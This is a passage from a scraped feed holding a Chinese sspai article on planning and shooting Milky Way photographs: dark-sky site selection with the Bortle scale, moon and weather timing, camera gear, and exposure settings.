alt=\"\"></figure><p>回头再看这部在 2007 年收视率极低的电视剧，不得不感叹，每一位演员都给出了扎实的表演，没有皇子夺嫡，也没有后宫争宠，就是展现政治生态、权力结构，好像距离我们的生活已经很遥远了，但依然可以纠正、补充我们对于古代政治的想象。</p>\n<p><strong> -END-</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/411701070\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737939"},{"title":"记录属于你的夜空：银河拍摄指南","date":"2021-07-10 07:56:48","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>在城市的包围下，繁星漫天的景象每次看到都直击人心，而那一条穿越穹顶的银河，则是星星中最受人追捧的那一个。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682519866.jpeg\" alt=\"cameron-venti-pqyvyqqa87s-unsplash\"><figcaption>Photo by <a href=\"https://unsplash.com/@ventiviews?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText\">Cameron Venti</a> on <a href=\"https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText\">Unsplash</a></figcaption></figure><p>很多人都觉得拍摄银河是一件非常困难的事情，比如很多人都会觉得只有非常高端的摄影器材才能拍摄、同时还需要非常专业的参数调教。实际上在数码摄影已经非常成熟了的今天，拍摄星空并不是什么难事，而且通过合理的工具使用，拍摄成功率也大大提升。</p>\n<p>事实上银河拍摄在天文摄影中也算是比较简单的一类了，属于星野摄影的范畴。比起更加专业的深空摄影等等，所需的装备和专业知识都相对较少。</p>\n<p>本文将介绍策划一次银河拍摄的前后流程，希望可以让更多的人接触星空、记录下星空下美好的回忆。</p>\n<h2>1. 前期准备</h2>\n<p>在正式拍摄之前，往往需要解决一些问题：</p>\n<ul>\n<li>在哪能拍？</li>\n<li>什么时候拍？</li>\n<li>用什么装备拍？</li>\n<li>还需要带什么？</li>\n</ul>\n<p>我们依次来解决这些问题</p>\n<h3>1.1 寻找银河拍摄地</h3>\n<p>或多或少，大家都知道拍星星要去比较黑的地方，那么怎么知道一个地方的夜空有多黑呢？</p>\n<p>在业余天文学里有一种对于天体可见性以及光污染有个分类方式，称为「波特尔暗空分类法」，将暗空分为 9 级。他们的表现是这样划分的<sup class=\"ss-footnote\" href=\"https://zh.wikipedia.org/wiki/%E6%B3%A2%E7%89%B9%E5%B0%94%E6%9A%97%E7%A9%BA%E5%88%86%E7%B1%BB%E6%B3%95\" title=\"维基百科：波特尔暗空分类法\" footnote-id=\"1\">1</sup>：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>级别</th>\n<th>名称</th>\n<th>色基</th>\n<th>描述</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>天空完全黑暗的观测点</td>\n<td>黑</td>\n<td>可以看到<a href=\"https://zh.wikipedia.org/wiki/%E9%BB%84%E9%81%93%E5%85%89\">黄道光</a>、<a href=\"https://zh.wikipedia.org/wiki/%E5%AF%B9%E6%97%A5%E7%85%A7\">对日照</a>和<a href=\"https://zh.wikipedia.org/wiki/%E9%BB%84%E9%81%93%E5%B8%A6\">黄道带</a>；<a href=\"https://zh.wikipedia.org/wiki/%E8%82%89%E7%9C%BC\">肉眼</a>可以直接清晰地看见 <a href=\"https://zh.wikipedia.org/wiki/%E4%B8%89%E8%A7%92%E5%BA%A7%E6%98%9F%E7%B3%BB\">M33</a>；在<a href=\"https://zh.wikipedia.org/wiki/%E5%A4%A9%E8%9D%8E%E5%BA%A7\">天蝎座</a>和<a href=\"https://zh.wikipedia.org/wiki/%E4%BA%BA%E9%A9%AC%E5%BA%A7\">人马座</a>之间的<a href=\"https://zh.wikipedia.org/wiki/%E9%93%B6%E6%B2%B3\">银河</a>亮到能在地面上投出事物的影子；容易看得到<a href=\"https://zh.wikipedia.org/wiki/%E5%A4%A7%E6%B0%A3%E5%85%89_(%E7%89%A9%E7%90%86%E5%AD%B8)\">大气光</a>；<a href=\"https://zh.wikipedia.org/wiki/%E6%9C%A8%E6%98%9F\">木星</a>和<a href=\"https://zh.wikipedia.org/wiki/%E9%87%91%E6%98%9F\">金星</a>会影响眼睛的<a href=\"https://zh.wikipedia.org/w/index.php?title=%E6%9A%97%E9%80%82%E5%BA%94&amp;action=edit&amp;redlink=1\">暗适应</a>程度；基本看不见周围的景物。</td>\n</tr>\n<tr>\n<td>2</td>\n<td>典型的真正黑暗的观测点</td>\n<td>灰</td>\n<td>沿着<a href=\"https://zh.wikipedia.org/wiki/%E5%9C%B0%E5%B9%B3%E7%BA%BF\">地平线</a>，<a href=\"https://zh.wikipedia.org/wiki/%E5%A4%A7%E6%B0%A3%E5%85%89_(%E7%89%A9%E7%90%86%E5%AD%B8)\">大气光</a>微弱可见；肉眼容易看到 M33；夏季时，可以看见银河的大多数结构；在黎明前或黄昏后，呈明显黄色的黄道光仍很明亮，可以投出事物的影子；出现的云看上去就像是星空中的黑洞；若没有星空照耀，仅能看到周围事物的模糊轮廓；仍能用肉眼直接看到<a href=\"https://zh.wikipedia.org/wiki/%E6%A2%85%E8%A5%BF%E8%80%B6%E5%A4%A9%E4%BD%93\">梅西耶天体</a>中的许多<a href=\"https://zh.wikipedia.org/wiki/%E7%90%83%E7%8B%80%E6%98%9F%E5%9C%98\">球状星团</a>。</td>\n</tr>\n<tr>\n<td>3</td>\n<td>乡村的星空</td>\n<td>蓝</td>\n<td>在地平线处会有一些<a href=\"https://zh.wikipedia.org/wiki/%E5%85%89%E6%B1%A1%E6%9F%93\">光污染</a>迹象；近地平线处的云被微微照亮，在头顶上方的云则是暗的；银河仍有丰富细节；肉眼仍能明显看见 <a href=\"https://zh.wikipedia.org/wiki/M15\">M15</a>、<a href=\"https://zh.wikipedia.org/wiki/M4_(%E7%90%83%E7%8A%B6%E6%98%9F%E5%9B%A2)\">M4</a>、<a href=\"https://zh.wikipedia.org/wiki/M5_(%E7%90%83%E7%8A%B6%E6%98%9F%E5%9B%A2)\">M5</a> 和 <a href=\"https://zh.wikipedia.org/wiki/M22_(%E6%98%9F%E5%9C%98)\">M22</a>；用<a href=\"https://zh.wikipedia.org/wiki/%E5%81%B4%E8%A6%96\">眼角余光法</a>也能很容易看得到 M33；在春季和秋季，黄道光还很明显，颜色也还可见；能模糊地看见近处的事物。</td>\n</tr>\n<tr>\n<td>4</td>\n<td>乡村/郊区的过渡带</td>\n<td>绿/黄</td>\n<td>在地平线上方的多个方向上可以看见呈拱形的光污染现象；黄道光依然可见，但在<a href=\"https://zh.wikipedia.org/wiki/%E5%A4%A9%E9%A0%82\">天顶</a>方向上延伸的范围很小甚至不到一半；地平线上方的银河仍能给人留下深刻的印象，但是大部分更精细的结构已难以辨认；除非<a href=\"https://zh.wikipedia.org/wiki/%E5%9C%B0%E5%B9%B3%E5%BA%A7%E6%A8%99%E7%B3%BB\">地平高度</a>大于 55°，否则用眼角余光法已很难看到 M33；在光污染的光源处，云被轻度照亮，但在头顶方向上仍是暗的；就算隔有一定距离，也能看清周围事物。</td>\n</tr>\n<tr>\n<td>5</td>\n<td>郊区的星空</td>\n<td>橙</td>\n<td>只能在春秋季节最好的晚上才能看到少许黄道光；地平线处的银河非常暗弱甚至看不见，在头顶方向则像褪色一般；在所有或大部分的方向上都能明显看见光污染的光源；云要比背景天空更亮。</td>\n</tr>\n<tr>\n<td>6</td>\n<td>明亮的郊区星空</td>\n<td>红</td>\n<td>无法看到黄道光了；仅在天顶方向才能看见银河；地平高度35°以下范围的天空中都发出灰白的光；在天空中任何地方的云都相当亮；周围事物清晰可见；至少要用<a href=\"https://zh.wikipedia.org/wiki/%E5%8F%8C%E7%AD%92%E6%9C%9B%E8%BF%9C%E9%95%9C\">双筒望远镜</a>才能看见 M33, 肉眼只能较清晰地看见 <a href=\"https://zh.wikipedia.org/wiki/M31\">M31</a>。</td>\n</tr>\n<tr>\n<td>7</td>\n<td>郊区/城市的过渡带或满月时</td>\n<td>红</td>\n<td>整个天空呈现出浅灰白色；在各个方向上光污染的强光源都清晰可见；银河已经看不见了；肉眼勉强可以看见 <a href=\"https://zh.wikipedia.org/wiki/M44\">M44</a> 或 M31，但非常模糊；云非常地亮；即使用中等大小的望远镜观测，最亮的梅西耶天体仍十分苍白。 在满月时，即使身处最暗的观测点，观测情况也不会好于这个等级。不过满月时的天空会显得更蓝一些。</td>\n</tr>\n<tr>\n<td>8</td>\n<td>城市的星空</td>\n<td>白</td>\n<td>天空发出白色、灰色或橙色的光，亮度足以让人阅读书籍；只有在最好的夜晚，同时观测者亦要有足够经验，才能用肉眼看到 M31 和 M44；用望远镜也仅能找到亮度较高的梅西耶天体；一些熟悉的星座已非常暗弱甚至完全看不见了。</td>\n</tr>\n<tr>\n<td>9</td>\n<td>市中心的星空</td>\n<td>白</td>\n<td>整个天空被照的通亮，一些熟悉的星座和较暗的星座已经看不见了；除了<a href=\"https://zh.wikipedia.org/wiki/%E6%98%B4%E5%AE%BF%E6%98%9F%E5%9B%A2\">昴宿星团</a>，肉眼再看不到任何梅西耶天体；只有<a href=\"https://zh.wikipedia.org/wiki/%E6%9C%88%E4%BA%AE\">月亮</a>、<a href=\"https://zh.wikipedia.org/wiki/%E8%A1%8C%E6%98%9F\">行星</a>和一些最明亮的<a href=\"https://zh.wikipedia.org/wiki/%E6%98%9F%E5%9B%A2\">星团</a>才能给观星者带来一些乐趣。</td>\n</tr>\n</tbody>\n</table></figure><p>根据分级描述，一般而言，根据这个暗夜地图大体就可以了解到某一个地区光害情况，寻找<strong>波特尔 3 级及以下</strong>的环境就较为适合拍摄银河了。通过地图来对潜在拍摄地进行初筛是个不错的方式，暗夜地图也比较好找，网上有不少，如：<a href=\"https://www.darkmap.cn/\" target=\"_blank\">https://www.darkmap.cn/</a></p>\n<p>今天重点推荐使用的 App PlanIt! Pro（巧摄专业版）当中也有这个功能，如下图所示，可以非常轻松的找到某个区域的暗夜等级和附近光污染状况。</p>\n<span class=\"ss-application\" app-id=\"16103\"> </span><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/6e9e8bdf99dbd985c8c5b2450cd1cd54\"></figure><blockquote><p>「巧摄 PlanIt」系列 App 是由中国摄影师「乔文杰」组织开发的，国内也有其他摄影师在做类似的 App，如摄影师「李召麒」目前大部分功能免费的「莉景天气」也是个不错的选择，大家亦可尝试。</p></blockquote>\n<span class=\"ss-application\" app-id=\"16104\"> </span><p>银河拍摄属于星野拍摄，意味着你将拍摄很大区域的一整片星空。如果在银心所在方向存在很强的光害源的话，画面中也将明确的看到光害的影响：</p>\n<p>如在 PlanIt Pro 中，如图所示可见在某处、某一时刻的银心以及银拱位置。从暗空地图可以看到该方向正好是北京的光害区域，于是在最终画面上也会受到光害的影响。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/5f62e5ef3f1c9088cf2851d89c59eb32\"><figcaption>图中绿色圈圈中间的涡旋状 icon 为银心方位</figcaption></figure><p>当然避免这种情况的方式也很简单：如果你前景有一些遮挡，如高山等，一般可以挡住大部分的光害。至于如何看前景遮挡物，我们下文再说。</p>\n<h4><strong>能不能不通过地图找到足够黑的地方？</strong></h4>\n<p>有的！为了引起大家对于光害的重视，国际暗夜星空协会（IDA）发布了名为「国际暗空场所」（International Dark-Sky Places，IDSP）的计划。该计划对国家公园、自然保护区等区域给予官方认证，同时对这些区域的夜空质量进行划分。<a href=\"https://www.darksky.org/our-work/conservation/idsp/finder/\" target=\"_blank\">在暗夜星空协会的官网可以找到这些经过认证的区域</a>。IDA 对于区域认证也有着比较详尽的评估方式，<a href=\"https://www.darksky.org/wp-content/uploads/bsk-pdf-manager/45_IDSS_GUIDELINES_CHINESE_2015.PDF\" target=\"_blank\">具体可以查看这个文件</a>。</p>\n<p>中国境内目前只有台湾省的合欢山暗空公园满足 IDSP 认证标准，其余的尚未提交认证申请。</p>\n<p>除了 IDA 之外，还有比如国际自然保护联盟（IUCN）的 Dark Skies Advisory Group 维护的<a href=\"http://darkskyparks.org/dsag/2021-02-28_DSAG_word_list.htm\" target=\"_blank\">世界暗夜保护区名录</a>（World List of Dark Sky Protected Areas），截至 2021 年 2 月，收录了 7 个中国的暗夜保护区：</p>\n<ul>\n<li>上饶葛源暗夜星空保护区（江西省上饶市横峰县葛源镇附近，中心点经纬度：28.60, 117.65）</li>\n<li>那曲暗夜星空保护区（西藏自治区那曲县罗玛镇附近，中心点经纬度：30.53, 91.20）</li>\n<li>阿里暗夜公园（西藏自治区阿里地区狮泉河镇附近，中心点经纬度：32.50, 80.12）</li>\n<li>太行洪谷暗夜星空保护区（山西省晋城市沁水县附近，中心点经纬度： 35.26, 112.04）</li>\n<li>盐城野芦荡暗夜星空保护地（江苏省盐城市大丰区附近，中心点经纬度：33.06, 120.82）</li>\n<li>铜川照金暗夜星空保护地（陕西省铜川市照金镇附近，中心点经纬度：35.05, 108.65）</li>\n<li>台湾合欢山暗空公园（台湾南投县仁爱乡大同村附近，部分合欢山森林公园与部分太鲁阁国家公园管辖区域，中心点经纬度：24.12, 121.29）</li>\n</ul>\n<p><a href=\"http://darkskyparks.org/dsag/map/\" target=\"_blank\">其余地区的暗夜保护区也可以在 DSAG 的地图上找到</a>。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682519881.jpg\" alt=\"\"></figure><p>需要注意的是，IUCN DSAG 和 IDA 认证的暗夜保护区并不仅仅是对夜空质量的评定，同时也包含对保护区保护措施、执行方案等多方面的评估，榜上的保护区是需要长时间维护该地暗空环境的。</p>\n<p>通过暗夜地图、或者直接前往暗夜保护区，都只是去到一片星空不错的区域，那么<strong>具体的拍摄机位如何选择</strong>呢？</p>\n<p>在大部分的银河拍摄中，除了拍摄银河本身，都还需要一个前景作为构图的一部分。这个前景可以是一个趣味的建筑，比如射电望远镜、长城敌楼等等，也可以是一个冰川、一个山峰、抑或是远处连绵的地形。对于前景的规划，PlanIt Pro 做了非常好用的功能：虚拟现实取景框。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682519893.png\" alt=\"IMG_4415\"><figcaption>可以直接属于想要去的拍摄地附近的 POI 名称，然后手动寻找机位</figcaption></figure><p>首先在地图上通过搜索或手动移动地图找到想要拍摄的点位，然后点击右下角加号添加为相机位置。你可以点击右下角的「取景框」icon 选择虚拟现实取景框，便会进入虚拟取景模式：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/a50b3f2b1a3ce9dd1935a4daa49ae98e\"></figure><p>你可以通过设置相机参数（如焦距）更改视野，哪怕你想接片也可以 选择接片张数等等，然后通过调整视角和仰角，就可以看到大致的视野了。你也可以通过设置时间，在取景框里模拟出某时刻天上银河的位置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682519972.png\" alt=\"IMG_4419\"><figcaption>接片模式下，可以看到接片后大致的视野与构图</figcaption></figure><p>需要注意的是，Planit Pro 只能针对地形有个大致的示意，如果面前有树、或者别的建筑物，则需要手工标记。详细的预取景是个细致的活，这里就不再展开了。</p>\n<p>找到合适的前景并不是终点，接下来还需要考虑自己<strong>抵达并留在这个拍摄点的可能性</strong>：比如是否开车可以直达、是不是需要徒步甚至登山、可不可以住宿、会不会需要交钱等等。</p>\n<p>综合这二者，基本可以确定一个良好的机位。</p>\n<h3>1.2 确定拍摄时间</h3>\n<p>对于大部分非职业的摄影爱好者而言，并没有大把的时间在一个拍摄机位等待一个最佳拍摄时机，于是<strong>提前算好一个良好的拍摄窗口时间</strong>就至关重要了。</p>\n<p>时间对于拍摄的影响主要有这么几个方面：</p>\n<ul>\n<li>每天银河升起的方位都不一致，升起落下时间也不一样；</li>\n<li>日子不对的话，一个探照灯一样的月亮会让整个夜空只剩它和其他几个极亮的星星；</li>\n<li>一个多云甚至下雨的天气，也会让整个拍摄泡汤；</li>\n</ul>\n<p>我们依次来说。</p>\n<p>由于银河是一整条光带，一般我们在拍摄银河的时候或多或少会希望看到一个完整的、半球形的银拱。对于北半球中间维度的我们，<strong>银拱一般在 3-7 月之间拍摄比较合适</strong>：3 月以前，银拱基本在快日出或日出后才升起，而 7 月开始，银拱经常天黑时已经升得太高，难以取景。</p>\n<p>对于月亮而言，一般情况下拍摄星空要尽量避免月亮对于星空的影响，有这样两个思路：</p>\n<ul>\n<li>月亮和银河各走各的，不同时出现，从而拥有拍摄窗口；</li>\n<li>月相还属于新月🌑、残月🌘、峨眉月🌒的时候，对于星空影响还不算大，也是能拍的日子；</li>\n</ul>\n<p>如果单纯只看月相，农历二十四开始的残月一直持续到下个月的农历初五初六，这中间的一周半都算是不错的日子；而要看月亮和银河是否时间重合，则只能依次看每日的月亮升起/落下时间、和银河升起/落下时间之间的窗口期。</p>\n<p>这时候，又到了我们万能的拍摄规划 App PlanIt! Pro 大显神通的时候了。</p>\n<p>你可以在 PlanIt! Pro 里找到银河搜索功能，首先选择可能的银河构图。这里银河构图是按照银拱的高度角计算的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682519999.jpg\" alt=\"IMG_4420\"></figure><p>如果你已经选好了拍摄地和大致构图，那么你大抵已经了解了你希望银河的仰角。在「可能的银河构图」里选择你想要的最高角度，确认后设置好起止日期，点击「结果」进入结果筛选。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520014.png\" alt=\"IMG_4421\"></figure><p>如上文所述，你可以选择筛选出「没有月亮」、「峨眉月」、「亏眉月」几个条件；对于我们上班族来说，平时晚上是没机会拍摄的，那么继续选择周六、周日，这样周末夜晚月亮达标的日子就筛选出来了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520040.png\" alt=\"IMG_4422\"><figcaption>大功告成</figcaption></figure><p>再来说说<strong>天气</strong>。</p>\n<p>比起上面说的日期筛选，天气才是最令人头疼的存在——日子不好顶多拍到的银河不完整、或比较暗，但一片云飘过来真的是让整个行程都泡汤……</p>\n<p>对于这种需要提前几天对天气进行判断的场景，我强烈推荐一款 App：Windy.com，当然它也支持在网页上直接查看，iOS 用户注意不要下错了 App，是红色的而不是蓝色的~</p>\n<span class=\"ss-application\" app-id=\"15932\"> </span><p>在 App 中，通过搜索或者直接拖动地图选择你找好的拍摄地，点击上面的小箭头就可以进入它详细预报模式。由于拍摄银河和云有很大的关系，我们进入 meteogram（气象图）模式，就可以看到未来几天云高、风力、降水量等等的数据啦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520064.png\" alt=\"IMG_4423\"><figcaption>Meteogram数据间歇性需要一些科学的访问姿势才能加载</figcaption></figure><p>推荐 windy.com 最大的原因，除了可以看云高外，最关键的是它<strong>集成了三种不同的天气预测数据</strong>！</p>\n<ul>\n<li>\n<strong>ECMWF</strong>（欧洲中期天气预报中心）是欧洲的模型，三小时预报间隔，精度 9km，是目前民间可以用到精度最佳的模型，也是目前世界公认准确性排名第一的存在。缺点是它一天只针对中国地区更新两次数据。</li>\n<li>\n<strong>GFS</strong>（全球预报系统）是美国气象局的预测模型，三小时预报间隔，但是精度只有 22km，也就是它 22km 范围算是同一种气候，在山里什么的就不太准。比起 ECMWF，它每天更新四次数据。</li>\n<li>\n<strong>ICON</strong>（德国马普气象研究所），是德国的，13km 精度，一天更新两次数据，可以用于备用。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520091.png\" alt=\"IMG_4424\"><figcaption>四种不同的数据源纵向对比界面。Meteoblue 并不提供天气预测，而是另一个公开的天气数据集成商，故不在上述预测模型列表中</figcaption></figure><p>结合云高，一般可以比较轻松的判断是否会影响拍摄，比如上周末在河北东甸子梁的拍摄中，云高普遍显示在 2km 以下，拍摄地海拔 2050m，就属于基本不会受影响的状态，事实也确实如此。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520117.jpg\" alt=\"_RXS1156\"><figcaption>上图拍摄于周六（3 日）下午 6 点，海拔 2050m。按照 Windy 的预测，下午 5 点过开始有云涌现，集中在海拔 2000m 以下，实际情况完全与 ECMWF 预测一致！</figcaption></figure><p>在临近拍摄日的时候，直接查看「中央气象台」的数据，中央气象台的数据已经做到了十几分钟间隔，对于拍摄当天判断成功率很有效。</p>\n<p>如果希望进一步的了解如何科学的查看天气，有一篇由科学摄影前辈李召麒老师写的文章：<a href=\"https://mp.weixin.qq.com/s?__biz=MzIwMTM4NTg0NA==&amp;mid=2652026523&amp;idx=1&amp;sn=6914bbe9af5621243b3fce5ab5a194a2\" target=\"_blank\">《如何科学的看天气预报》</a>可以进一步学习下。</p>\n<blockquote><p>需要注意的是，天气预报永远是不准的，大家还是需要在每一次外出时积累经验、以及慢慢接触并熟悉一些地理常识：如树林子一般都会形成自己的局部小气候等等。</p></blockquote>\n<p><strong>结合天气和月相，就可以确定好拍摄日期</strong>啦。要进一步细化时间的话，返回之前的虚拟取景框，移动下面的时间轴，找到你想要的银河构图，具体的拍摄时间就也确定啦。</p>\n<h3>1.3 确定拍摄装备</h3>\n<p>什么相机可以拍银河，这似乎是个老生常谈的问题。我也时常收到「某某相机是否可以拍银河」这样的问题。先说结论：<strong>原则上可以长时间曝光的设备都可以拍摄，无论是 GoPro、还是手机，抑或是黑卡一类的DC、全画幅无反、大画幅胶片等等……</strong></p>\n<p>其实问出这个问题也很好理解：银河比较暗，这个大家都知道，在拍摄银河是往往长时间曝光也不完全够，还需要提高 ISO，有些相机在高 ISO 的情况下表现一般，画面遍布噪点，拍出来观感并不好，这也是很多人担心自己的相机「拍不好银河」的主要原因。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520131.jpg\" alt=\"3971625740175_.pic_hd\"><figcaption>朋友「阳光大蓝孩」（公众号：走进荒野 IntoWild）使用小米 Mi 10 Ultra 拍摄的银河（30s 曝光, f/1.85, ISO12800）</figcaption></figure><p>近几年很多手机厂商都开始宣传自己的手机可以拍摄星空，其中大部分，本质并不是突破了高 ISO 时的噪声问题，而是通过计算摄影的方式、后期进行多张堆栈叠加从而提升画面表现的。我们在 Photoshop 等图像处理工具中也可以对手机以外的其他设备拍摄的照片采取同样的方式，从而得到一个相对可接受的结果。当然，这很麻烦，这意味着你需要在一个地方使用三脚架稳定的拍摄多张长时间曝光的照片，然后进一步在电脑中完成后期。于是，什么样的相机可以拍摄银河这个问题，经常看到的答案是：</p>\n<p><strong>「使用全画幅相机，镜头光圈要大，2.8 最起码，1.4 更好」</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520145.jpg\" alt=\"_DS\"></figure><p>上图中，上中下分别为 5D2、D610、A7M3 拍摄的银河，三款相机分别于 2008 年、2013 年、2018 年发布，虽然相隔十年，但对于银河这种题材而言一般拍摄并不会有显著差异。</p>\n<p>相机选好了，那么带什么样的镜头？在上述使用虚拟取景框中的过程中，有一个焦距和转向的选择。其实在前期我们可以通过这个功能规划好到底需要什么样的镜头来取景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/c223031a67cc1e6898d16fb82b67a2d7.PNG\"></figure><p>从取景框里，我们可以看到如果我要在这个位置拍摄萨普神山的银河，使用 14mm 的镜头可以同时收入银河和神山。</p>\n<blockquote><p>如果你使用的并不是全画幅相机，那么你需要将镜头焦距转化成为35mm等效焦距再来估算。如 APS-C 幅的相机一般乘以 1.5 的系数，而 M43 画幅的则需乘以 2。</p></blockquote>\n<p>当然只有广角能拍银河么？当然不是，在一些特殊的构图下，标准焦距甚至长焦也可以拍出有意思的画面，你只要发挥你的想像就好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520158.jpg\" alt=\"p2\"><figcaption>分别为 14mm、35mm、50mm 焦距镜头拍摄，35mm 图来自司与（微博@SY小与），50mm 图来自「星缘山风队」摄影师（微博@爱拍星空）</figcaption></figure><p>其余的拍摄设备，<strong>三脚架是必备的</strong>；如果希望更长时间的曝光，部分相机可能需要<strong>对应的快门线</strong>进行辅助。</p>\n<p>如果你希望更加进阶的拍摄银河细节，那么<strong>赤道仪</strong>是你升级的方向。赤道仪可以让你更久的跟踪拍摄银河，从而抵消地球自转带来的星空位移，这样你可以非常长时间的曝光，从而获得更多细节。本文就不对赤道仪进行展开了。</p>\n<h3>1.4 其他装备准备</h3>\n<p>由于银河拍摄一般是在夜间，于是<strong>必要的照明和保暖</strong>就是必备的了。有些时候拍摄地可能没有信号，那么和在外界通联的<strong>电台或卫星电话</strong>也是必要的。如果要拍摄很久，考虑带个折叠椅等等也是不错的选择。</p>\n<p>如果要涉及到野外过夜，那么请参考我之前的文章<a href=\"https://sspai.com/post/65272\" target=\"_blank\">《一步步走近自然，写给露营新手的入门说明书》</a>。</p>\n<h2>2. 拍摄执行</h2>\n<p>做完所有的前期准备，那就出发吧~</p>\n<p>在具体拍摄执行阶段，大家最关心的其实就是<strong>如何正确的曝光</strong>。很多人看到一张拍摄银河的照片后都喜欢询问用什么样的参数进行拍摄的，实际上意义并不很大，每个地方因为周边环境反射光等原因，需要的参数各不相同。首先我们需要明确的是：</p>\n<ul>\n<li>光圈需要尽可能大，除非过分影响景深；</li>\n<li>快门速度并不是可以随意增长的，由于地球自转，星星也在动，长时间曝光星星会在画面中拖尾形成「星轨」。为了避免这样的现象发生，一般遵循「500法则」或「600法则」，即：用 500 除以镜头焦距（35mm 等效焦距）算出最长曝光时间，如使用 24mm 镜头在全画幅机身上进行拍摄，则快门速度不宜长于 500÷24≈21s。随着现在相机像素越来越高，星星拖尾可被察觉的也越来越明显，对于高像素的相机（比如 R5、A7R3、A7R4 等等）需要在 500 法则下继续做减法，如用 300 作为基准除以焦距等等。根据这样的方式，你可以获得一个「最长曝光时间」；</li>\n<li>拍摄 RAW 格式，以便后期更好的处理照片。</li>\n</ul>\n<p>如果是利用数码相机进行拍摄，其实在实际拍摄时可以非常简单的找到合适的参数组合。对于新手，我一般推荐如下操作方式：</p>\n<ul>\n<li>如果没有什么近处（一般指 5m 内）的前景（比如帐篷、汽车等）镜头对焦设置为手动对焦，拧到 ∞ 无限远的位置后，往回稍微退一点点；如果近处有前景，可以用手机或灯光照亮前景物体，利用相机实时取景功能放大进行对焦，并将对焦模式设置成 MF；</li>\n<li>先使用相机能提供的最高 ISO、和1s左右的快门速度进行试拍，查看曝光和对焦、构图情况；</li>\n<li>调整曝光、对焦、构图，直至达到满意效果；</li>\n<li>提升快门速度至上述「最长曝光时间」附近，记录下从先前的快门速度往上「拨弄」了几档，同样的将 ISO 向下降低几档，这样你就得到了最适合你今天的拍摄参数；</li>\n<li>enjoy</li>\n</ul>\n<p>在完全黑暗的环境中拍摄夜空，经常会遇到前景无法看清的情况，也可以考虑在相同的位置增加曝光，单独拍摄一张前景图片，后期进行合成。</p>\n<blockquote><p>如果使用赤道仪进行拍摄，则可以无视上面的「最长曝光时间」限制。但由于赤道仪会跟着转，拍摄星空后地景一般会有虚影，所以一般会采用单独一张地景、然后后期进行合成的方式进行。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520179.jpg\" alt=\"\"><figcaption>Jason De Freitas (Instagram @jase.film) 使用 Bronica SQ-A 搭配 80mm 镜头 F3.5 光圈、Kodak Ektar 100 胶片，赤道仪跟踪并曝光 105 分钟，迫冲2档</figcaption></figure><p>如果是胶片摄影，我敬你是条汉子（划掉！）……胶片拍摄银河相比于拍摄星轨等星野题材确实会难很多，毕竟胶片一般感光度并不很高，后期一般也需要迫冲等手段让画面可用。需要注意的是，胶片存在倒易率失效的问题：可以简单理解成为随着曝光时间增长，胶片的感光越来越迟钝（类似于感光度越来越低）。每种胶片的倒易率都不同（甚至同种胶片不同批次的也不一样），一般需要查表或做实验来估算。常见的胶片超过 1s 的曝光就会有明显的倒易率失效问题，1s 曝光时不少胶片会欠曝一档，还是挺严重的……《纽摄》中大约有这样的一个普遍可用的倒易率失效补偿基本估算表：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>测光正常的曝光时间</th>\n<th>胶片需增加的曝光时间</th>\n<th>显影时间变化</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>1/1000s</td>\n<td>不变</td>\n<td>不变</td>\n</tr>\n<tr>\n<td>1s</td>\n<td>2s</td>\n<td>-10%</td>\n</tr>\n<tr>\n<td>10s</td>\n<td>40s</td>\n<td>-20%</td>\n</tr>\n<tr>\n<td>100s</td>\n<td>800s</td>\n<td>-30%</td>\n</tr>\n</tbody>\n</table></figure><p>当然，用胶片拍出的银河，那成就感也是不可比拟的~</p>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520197.jpg\" alt=\"DSC08285\"></figure><p>除了相机设置之外，拍摄期间<strong>务必注意保暖</strong>，如果要在相机周围走动，可以考虑给三脚架下放一个不影响拍摄的小小小灯，用来提醒他人不要绊倒。</p>\n<h2>3. 